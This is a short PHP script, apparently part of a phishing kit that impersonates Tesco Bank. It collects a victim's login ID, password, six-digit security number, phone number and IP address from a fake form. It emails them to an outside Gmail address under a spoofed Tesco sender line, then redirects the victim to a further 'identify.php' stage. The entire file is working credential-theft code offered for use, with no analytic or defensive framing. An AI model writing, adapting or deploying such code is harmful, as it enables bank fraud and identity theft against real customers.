<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$_SESSION['mob'] = $_POST['mob'];


$msg = "
---------------------------------
Unique ID: ".$_POST['uiq']."
Password: ".$_POST['psd']."
6 Digit Security Number: ".$_POST['DIGIT1']."".$_POST['DIGIT2']."".$_POST['DIGIT3']."".$_POST['DIGIT4']."".$_POST['DIGIT5']."".$_POST['DIGIT6']."
Phone Number: ".$_POST['mob']."
--------xXx--------
IP Address: $ip
";

$subj = "TescoSavings 2019 | $ip";
$headers = "From: Tesc0 <info@tesco.com>\n";

mail("ENGLAND.KATTY@gmail.com", $subj, $msg,"");

header("Location: identify.php?i=AAMkADcyMWNlOGU4LTA1MTctNGU5NC04NmVhLTM2ZjY2MWQ1ODUyZQAuAAAAAACPL3Vd8cnLS4%2FrNHDvh%2BurAQDLxtTRqKyYQrNPEBhBv0F3AAAMdHa7AAA_938945743421MTctNGU5NC04NmVhLTM2ZjY2MW1MTctNGU5NC04NmVhLTM2ZjY2MW");
?>